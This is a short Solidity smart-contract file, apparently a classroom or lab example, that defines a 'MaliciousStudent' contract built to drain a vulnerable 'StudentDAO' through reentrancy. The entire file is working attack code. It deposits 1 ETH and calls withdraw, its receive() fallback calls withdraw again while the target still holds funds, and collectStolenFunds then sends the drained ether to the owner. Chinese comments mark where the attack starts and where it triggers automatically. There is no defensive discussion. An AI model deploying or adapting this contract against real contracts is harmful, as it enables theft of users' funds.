// SPDX-License-Identifier
pragma solidity ^0.8.0;

interface IStudentDAO {
    function deposit() external payable;
    function withdraw() external;
}

contract MaliciousStudent {
    IStudentDAO public dao;
    address public owner;

    constructor(address _daoAddress) {
        dao = IStudentDAO(_daoAddress);
        owner = msg.sender;
    }

    // 攻擊開始
    function attack() public payable {
        require(msg.value >= 1 ether, "Need 1 ETH to attack");
        dao.deposit{value: 1 ether}();
        dao.withdraw();
    }

    // 收到錢時自動觸發
    receive() external payable {
        if (address(dao).balance >= 1 ether) {
            dao.withdraw();
        }
    }

    function collectStolenFunds() public {
        payable(owner).transfer(address(this).balance);
    }
}